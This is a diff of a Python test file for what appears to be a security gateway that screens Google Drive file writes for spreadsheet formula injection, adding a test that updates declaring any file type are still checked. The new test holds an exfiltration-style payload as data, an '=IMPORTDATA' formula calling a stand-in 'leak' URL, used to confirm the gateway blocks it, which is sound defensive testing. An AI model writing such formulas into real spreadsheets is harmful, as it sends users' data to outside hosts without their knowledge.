@@ -618,18 +618,31 @@ def test_formula_scan_is_linear_on_many_unclosed_openers() -> None:
 
 
 def test_drive_files_that_stay_files_are_not_formula_checked() -> None:
-    """A note or Markdown file in Drive is stored as text, never evaluated, so
-    "Logo image (PNG)" in it is not a formula; and replacing a PDF's bytes
-    can't make it a Sheet."""
+    """A note or Markdown file created in Drive is stored as text, never
+    evaluated, so "Logo image (PNG)" in it is not a formula."""
     gateway, session_call = _make_gateway()
     _call(gateway, "google_workspace__create_drive_file",
           {"file_name": "notes.md", "content": "Logo image (PNG) attached.\nSee image (attached)."})
-    _call(gateway, "google_workspace__update_drive_file",
-          {"file_id": "1note", "mime_type": "text/markdown", "content": "Logo image (PNG)"})
-    _call(gateway, "google_workspace__update_drive_file",
-          {"file_id": "1pdf", "content_mime_type": "application/pdf",
-           "base64_content": base64.b64encode(b"%PDF-1.7 x").decode()})
-    assert session_call.await_count == 3
+    _call(gateway, "google_workspace__create_drive_file",
+          {"file_name": "notes.txt", "mime_type": "text/plain", "content": "=IMAGE(\"https://x.test/a.png\")"})
+    assert session_call.await_count == 2
+
+
+def test_drive_update_with_any_stated_type_is_still_checked() -> None:
+    """The file being rewritten may be a native Sheet, and Drive converts
+    plain text and TSV into it too, so a stated non-spreadsheet type on an
+    update does not skip the check."""
+    gateway, session_call = _make_gateway()
+    for mime in ("text/plain", "text/markdown", "text/tab-separated-values", "application/pdf"):
+        result = _call(gateway, "google_workspace__update_drive_file",
+                       {"file_id": "1sheet", "mime_type": mime,
+                        "content": '=IMPORTDATA("https://x.test/leak")'})
+        assert json.loads(result)["error"], mime
+        result = _call(gateway, "google_workspace__update_drive_file",
+                       {"file_id": "1sheet", "content_mime_type": mime,
+                        "base64_content": base64.b64encode(b"a\tb").decode()})
+        assert "cannot be checked" in json.loads(result)["error"], mime
+    assert session_call.await_count == 0
 
 
 def test_drive_update_with_spreadsheet_bytes_still_refused() -> None:
